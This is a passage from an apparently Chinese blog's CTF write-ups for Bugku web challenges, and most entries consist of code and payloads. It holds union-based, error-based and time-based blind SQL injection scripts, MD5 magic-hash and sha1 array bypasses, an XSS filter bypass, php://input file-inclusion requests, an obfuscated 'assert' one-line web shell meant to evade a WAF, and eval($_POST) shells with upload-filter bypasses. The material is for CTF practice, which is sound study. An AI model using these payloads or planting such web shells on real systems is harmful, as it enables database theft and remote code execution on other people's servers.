class="line">include_once <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, 0);</span><br><span class="line"><span class="variable">$str</span> = strstr(<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line"><span class="variable">$str</span> = substr(<span class="variable">$str</span>,1);</span><br><span class="line"><span class="variable">$str</span> = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,<span class="variable">$str</span>);</span><br><span class="line">parse_str(<span class="variable">$str</span>);</span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$key1</span>) == md5(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>双写key绕过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?kekeyy1=QNKCDZO&amp;kekeyy2=240610708</span><br></pre></td></tr></table></figure></p><h1 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h1><p><a href="https://blog.csdn.net/csu_vc/article/details/78375203" target="_blank" rel="noopener">https://blog.csdn.net/csu_vc/article/details/78375203</a></p><h1 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h1><p>普通注入题<br>判断列数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id=1<span class="string">'order by 4 #</span></span><br></pre></td></tr></table></figure></p><p>判断显示位<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id=-1<span class="string">' union select 1,2,3,4 %23</span></span><br></pre></td></tr></table></figure></p><p>表名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id=-1<span class="string">' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()),4 %23</span></span><br></pre></td></tr></table></figure></p><p>字段名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id=-1<span class="string">' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x666C3467),4 %23</span></span><br></pre></td></tr></table></figure></p><p>脱裤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id=-1<span class="string">' union select 1,2,(select group_concat(skctf_flag) from fl4g),4 %23</span></span><br></pre></td></tr></table></figure></p><h1 id="秋名山司机"><a href="#秋名山司机" class="headerlink" title="秋名山司机"></a>秋名山司机</h1><p><a href="http://www.runoob.com/python/python-reg-expressions.html" target="_blank" rel="noopener">python正则</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/qiumingshan/'</span></span><br><span class="line">s = requests.session()</span><br><span class="line">txt = s.get(url)</span><br><span class="line">exp = re.search(r<span class="string">'(\d+[+\-*])+(\d+)'</span>, txt.text).group()</span><br><span class="line"><span class="comment">#print(exp)</span></span><br><span class="line">result = <span class="built_in">eval</span>(exp)</span><br><span class="line">post = &#123;<span class="string">'value'</span>: result&#125;</span><br><span class="line"><span class="built_in">print</span>(s.post(url, data = post).content)</span><br></pre></td></tr></table></figure></p><h1 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h1><p><a href="https://blog.csdn.net/mylyylmy/article/details/80030256" target="_blank" rel="noopener">https://blog.csdn.net/mylyylmy/article/details/80030256</a></p><h1 id="web-6"><a href="#web-6" class="headerlink" title="web 6"></a>web 6</h1><p>通过抓包可知，把返回消息头的flag的值base64两次，赋值给margin，post margin，速度要快，该flag的值是会变的，所以只能通过py实现。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import re</span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/web6/'</span></span><br><span class="line">s=requests.session()</span><br><span class="line">header=s.get(url).headers</span><br><span class="line"><span class="built_in">print</span>(header[<span class="string">'flag'</span>])</span><br><span class="line">base1=base64.b64decode(header[<span class="string">'flag'</span>])</span><br><span class="line"><span class="comment">#print(type(base1))</span></span><br><span class="line">key=base64.b64decode(re.split(<span class="string">':'</span>,str(base1))[1])</span><br><span class="line">data=&#123;<span class="string">"margin"</span>:key&#125;</span><br><span class="line">flag=s.post(url,data=data).content</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="COOKIE欺骗"><a href="#COOKIE欺骗" class="headerlink" title="COOKIE欺骗"></a>COOKIE欺骗</h1><p>通过观察url，base64解密，filename,得到keys.txt。猜测文件名被base64编码传入，将index.php进行base64编码，传入，看到&lt;?php， 注意到url中的num参数，修改一下值，发现返回值变了，猜测通过num的值，来返回index.php源码的第几行代码。写个py遍历一下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,50):</span><br><span class="line">    url=<span class="string">"http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw"</span>%i</span><br><span class="line">    r=requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></p><p>可得源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$file</span>=base64_decode(isset(<span class="variable">$_GET</span>[<span class="string">'filename'</span>])?<span class="variable">$_GET</span>[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line"><span class="variable">$line</span>=isset(<span class="variable">$_GET</span>[<span class="string">'line'</span>])?intval(<span class="variable">$_GET</span>[<span class="string">'line'</span>]):0;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line"><span class="variable">$file_list</span> = array(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_COOKIE</span>[<span class="string">'margin'</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line"><span class="variable">$file_list</span>[2]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="variable">$file</span>, <span class="variable">$file_list</span>))&#123;</span><br><span class="line"><span class="variable">$fa</span> = file(<span class="variable">$file</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$fa</span>[<span class="variable">$line</span>];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析可得，当Cookie:margin=margin 时，keys.php文件，会包含在$file_list数组中，然后在把keys.php进行base64编码，赋值给filename,就会返回flag.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?line=&amp;filename=a2V5cy5waHA=</span><br><span class="line">Cookie:margin=margin</span><br></pre></td></tr></table></figure></p><h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>过滤了&lt;&gt;,用unicode绕过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=\u003cimg%20src=1%20onerror=alert(_key_)\u003e</span><br></pre></td></tr></table></figure></p><h1 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h1><p>访问1p.html，得到源码，对其进行部分base64解码，在url解码可得如下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var Words =</span><br><span class="line"><span class="string">"&lt;script&gt;window.location.href='http://www.bugku.com';&lt;/script&gt; </span></span><br><span class="line"><span class="string">&lt;!--"</span>;<span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">header(<span class="string">'Location: hello.php?id=1'</span>);</span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">'a'</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="variable">$a</span>,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'no no no no no no no'</span>;</span><br><span class="line"><span class="built_in">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @file_get_contents(<span class="variable">$a</span>,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">"bugku is a nice plateform!"</span> and <span class="variable">$id</span>==0 and strlen(<span class="variable">$b</span>)&gt;5 and eregi(<span class="string">"111"</span>.substr(<span class="variable">$b</span>,0,1),<span class="string">"1114"</span>) and substr(<span class="variable">$b</span>,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">require(<span class="string">"f4l2a3g.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">print</span> <span class="string">"never never never give up !!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;--&gt;<span class="string">" </span></span><br><span class="line"><span class="string">function OutWord()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">var NewWords;</span></span><br><span class="line"><span class="string">NewWords = unescape(Words);</span></span><br><span class="line"><span class="string">document.write(NewWords);</span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string">OutWord();</span></span><br><span class="line"><span class="string">// --&gt;</span></span><br></pre></td></tr></table></figure></p><p><a href="http://php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">php://</a><br><br>由源码可知，id要和0相等，但是不能为零，这时id只能为字符串。<br>对b的要求长度要大于5,‘111’+b[0]要包含在‘1114’,并且b[0]不等于4,所以用unicode编码，且b前面为%00，让ergegi处理的时候被截断（strlen不会），此时就符合了。<br>a为php://input,php://input可以读取没有处理过的POST数据,post传入的bugku is a nice plateform! 即可。<br>最终请求包为：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /<span class="built_in">test</span>/hello.php?id=q&amp;b=%00144565&amp;a=php://input HTTP/1.1</span><br><span class="line">Host: 120.24.86.145:8006</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 26</span><br><span class="line">X-Forwarded-For: 127.0.0.1, 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">bugku is a nice plateform!</span><br></pre></td></tr></table></figure></p><h1 id="welcome-to-bugkuctf-1"><a href="#welcome-to-bugkuctf-1" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!--  </span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">"txt"</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">"file"</span>];  </span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$user</span>)&amp;&amp;(file_get_contents(<span class="variable">$user</span>,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    include(<span class="variable">$file</span>); //hint.php  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><h1 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="variable">$poc</span>=<span class="string">"a#s#s#e#r#t"</span>; </span><br><span class="line"><span class="variable">$poc_1</span>=explode(<span class="string">"#"</span>,<span class="variable">$poc</span>); </span><br><span class="line"><span class="variable">$poc_2</span>=<span class="variable">$poc_1</span>[0].<span class="variable">$poc_1</span>[1].<span class="variable">$poc_1</span>[2].<span class="variable">$poc_1</span>[3].<span class="variable">$poc_1</span>[4].<span class="variable">$poc_1</span>[5]; </span><br><span class="line"><span class="variable">$poc_2</span>(<span class="variable">$_GET</span>[<span class="string">'s'</span>]) ?&gt;</span><br></pre></td></tr></table></figure><p><a href="http://www.w3school.com.cn/php/func_filesystem_glob.asp" target="_blank" rel="noopener">glob</a><br><br><a href="http://php.net/manual/zh/function.file.php" target="_blank" rel="noopener">file</a><br><br><a href="http://blog.csdn.net/ltx06/article/details/52065330" target="_blank" rel="noopener">print_r与var_dump的区别</a><br><br>给s赋值，命令执行，先读取文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://120.24.86.145:8010/?s=print_r(glob(%22*.*%22))</span><br></pre></td></tr></table></figure></p><p>读取flag.txt<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://120.24.86.145:8010/?s=print_r(file(%22flag.txt%22))</span><br></pre></td></tr></table></figure></p><h1 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(<span class="string">'2.php'</span>);</span><br><span class="line"><span class="variable">$key</span>=<span class="string">'KEY&#123;********************************&#125;'</span>;</span><br><span class="line"><span class="variable">$IM</span>= preg_match(<span class="string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim(<span class="variable">$_GET</span>[<span class="string">"id"</span>]), <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$IM</span> )&#123; </span><br><span class="line">  die(<span class="string">'key is: '</span>.<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="http://wiki.jikexueyuan.com/project/php/regular-expression.html" target="_blank" rel="noopener">php正则表达式</a><br><br><a href="http://www.runoob.com/regexp/regexp-rule.html" target="_blank" rel="noopener">php正则匹配规则</a><br>考查php正则，<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://120.24.86.145:8002/web10/?id=key2keykeykeykeykey:/c/keya?</span><br></pre></td></tr></table></figure></p><h1 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h1><p>一开始没注意看源码，没注意到源码中有个code.txt链接。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'v1'</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">'v2'</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">'v1'</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">'v2'</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">'v3'</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$v1</span> != <span class="variable">$v2</span> &amp;&amp; md5(<span class="variable">$v1</span>) == md5(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp(<span class="variable">$v3</span>, <span class="variable">$flag</span>))&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>考查两点<br><br>1.v1不等于v2,但v1和v2的md5加密后相等<br><br>2.strcmp漏洞(5.3的之前和之后版本在使用strcmp比较数组和字符串时候的差异。在5.3的版本之后使用这个函数比较会返回0)<br><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=240610708&amp;v3[]=1</span><br></pre></td></tr></table></figure></p><h1 id="login1"><a href="#login1" class="headerlink" title="login1"></a>login1</h1><p>sql约束攻击（上次第三届百越杯，就遇到过，被宿友发现，听宿友装了挺久的笔）<br><br><a href="http://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">mysql约束攻击</a><br><br>注册admin+无数个空格+1账户，相当于注册admin账户，有着相同的权限，然后就能用admin账户登入了</p><h1 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>); </span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">'id'</span>] = urldecode(<span class="variable">$_GET</span>[<span class="string">'id'</span>]); </span><br><span class="line"><span class="variable">$flag</span> = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>; </span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'uname'</span>]) and isset(<span class="variable">$_POST</span>[<span class="string">'passwd'</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'uname'</span>] == <span class="variable">$_POST</span>[<span class="string">'passwd'</span>]) </span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> <span class="string">'passwd can not be uname.'</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">'uname'</span>]) === sha1(<span class="variable">$_POST</span>[<span class="string">'passwd'</span>])&amp;(<span class="variable">$_GET</span>[<span class="string">'id'</span>]==<span class="string">'margin'</span>)) </span><br><span class="line"></span><br><span class="line">        die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> <span class="string">'sorry!'</span>; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>1.将margin进行url编码两次，赋值给id<br><br>2.利用sha1()函数的漏洞来绕过。如果把这两个参数为数组，如：?uname[]=a&amp;passwd[]=b，这样在第一处判断时两数组是不同，但在第二处判断时由于sha1()函数无法处理数组类型，将warning并返回false，false=flase,条件成立。<br><br>post<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://120.24.86.145:8002/web7/?id=%25%36%44%25%36%31%25%37%32%25%36%37%25%36%39%25%36%45&amp;uname[]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">passwd[]=4</span><br></pre></td></tr></table></figure></p><h1 id="web-8"><a href="#web-8" class="headerlink" title="web 8"></a>web 8</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$ac</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$f</span> = trim(file_get_contents(<span class="variable">$fn</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ac</span> === <span class="variable">$f</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" <span class="variable">$flag</span>&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="http://blog.csdn.net/qq_34642668/article/details/68923105" target="_blank" rel="noopener">file_put_contents和file_get_contents</a><br>php://input可以读取没有经过处理的post请求<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://120.24.86.145:8002/web8/?fn=php://input&amp;ac=qianye</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">qianye</span><br></pre></td></tr></table></figure></p><h1 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h1><p>一开始bp抓包，查看包，修改包，没有什么信息，最后，随便尝试一下 ，robots.txt.发现一个不能访问的目录，访问该目录，只看到一行源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[x]==<span class="variable">$password</span>)</span><br></pre></td></tr></table></figure></p><p>完全靠猜，感觉没意思，？x=admin，即可得到flag.</p><h1 id="getwebshell"><a href="#getwebshell" class="headerlink" title="getwebshell"></a>getwebshell</h1><p>开始尝试%00截断失败。尝试。<br><br>修改第一个<a href="https://www.cnblogs.com/52fhy/p/5436673.html" target="_blank" rel="noopener">content-type</a>: 将其中的几个字母改成大写，绕过。<br><br>第二个<a href="http://blog.csdn.net/qq_38135094/article/details/69945249" target="_blank" rel="noopener">content-type</a>:改成image/jpg。<br><br>php别名：php2, php3, php4, php5, phps, pht, phtm, phtml 均尝试修改一下,php5可以。</p><h1 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getIp</span></span>()&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ip_arr</span> = explode(<span class="string">','</span>, <span class="variable">$ip</span>);</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$ip_arr</span>[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$host</span>=<span class="string">"localhost"</span>;</span><br><span class="line"><span class="variable">$user</span>=<span class="string">""</span>;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">""</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$connect</span> = mysql_connect(<span class="variable">$host</span>, <span class="variable">$user</span>, <span class="variable">$pass</span>) or die(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db(<span class="variable">$db</span>) or die(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'your ip is :'</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"insert into client_ip (ip) values ('<span class="variable">$ip</span>')"</span>;</span><br><span class="line">mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p><a href="http://php.net/manual/zh/reserved.variables.server.php" target="_blank" rel="noopener">$_SERVER</a><br><br><a href="http://blog.csdn.net/hwz2311245/article/details/53941523" target="_blank" rel="noopener">insert into 攻击的原理</a><br><br><a href="https://zhuanlan.zhihu.com/p/33097764" target="_blank" rel="noopener">requests库的详解</a><br><br>py解得<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from requests import ReadTimeout</span><br><span class="line">import string</span><br><span class="line">url=<span class="string">"http://120.24.86.145:8002/web15/"</span></span><br><span class="line">strings=string.ascii_lowercase+string.ascii_uppercase+string.digits</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,35):</span><br><span class="line">    <span class="keyword">for</span> str0 <span class="keyword">in</span> strings:</span><br><span class="line">        payload=<span class="string">"11'+(select case when (substring((select flag from flag ) from &#123;0&#125; for 1 )='&#123;1&#125;') then sleep(4) else 1 end ) and '1'='1"</span>.format(str(i),str0)</span><br><span class="line">        header=&#123;<span class="string">"x-forwarded-for"</span>: payload&#125;</span><br><span class="line">        try:</span><br><span class="line">            response=requests.get(url,headers=header,timeout=3)</span><br><span class="line">        except ReadTimeout :</span><br><span class="line">            flag+=str0</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></p><h1 id="这是一个神奇的登入框"><a href="#这是一个神奇的登入框" class="headerlink" title="这是一个神奇的登入框"></a>这是一个神奇的登入框</h1><p><a href="https://baijiahao.baidu.com/s?id=1577401223226080294&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">SQL注入-基于报错注入</a><br><br>这题的字符串是双引号括起来的，输入”就会报错，然后就是报错注入了，常用的报错语句上面的链接有。<br><br>直接给出payload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">admin_name=1<span class="string">"and multilinestring((select * from(select * from(select group_concat(flag1) from flag1)a)b)) and "</span>1 &amp;admin_passwd=Qianye&amp;submit=GO+GO+GO</span><br></pre></td></tr></table></figure></p><h1 id="多次-1"><a href="#多次-1" class="headerlink" title="多次"></a>多次</h1><p><a href="https://www.jianshu.com/p/65f05e7cc957" target="_blank" rel="noopener">sql盲注</a><br>这道题不懂，感觉是盲注，但是又做不出来</p><h1 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h1><p>下载压缩包，后得源码,这道题有加密密文的，可是下载的文件里竟然没有，出题者应该忘记写上了。<br></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> encrypt(<span class="variable">$data</span>,<span class="variable">$key</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$key</span> = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">    <span class="variable">$x</span> = 0;</span><br><span class="line">    <span class="variable">$len</span> = strlen(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$klen</span> = strlen(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=0; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$x</span> = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span>+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=0; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span> .= chr((ord(<span class="variable">$data</span>[<span class="variable">$i</span>]) + ord(<span class="variable">$char</span>[<span class="variable">$i</span>])) % 128);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> base64_encode(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>查看源码，发现有upload.php页面，上传一个包含一句话的图片，用菜刀连接时，显示_@eval($<em>POST[‘Qianye’]</em> ,猜测&lt;?php ?&gt;被过滤了。<br>可以用<br>用绕过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;script language=php&gt;</span><br><span class="line">@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[pupil]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>也可以涨个姿势<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?=<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span 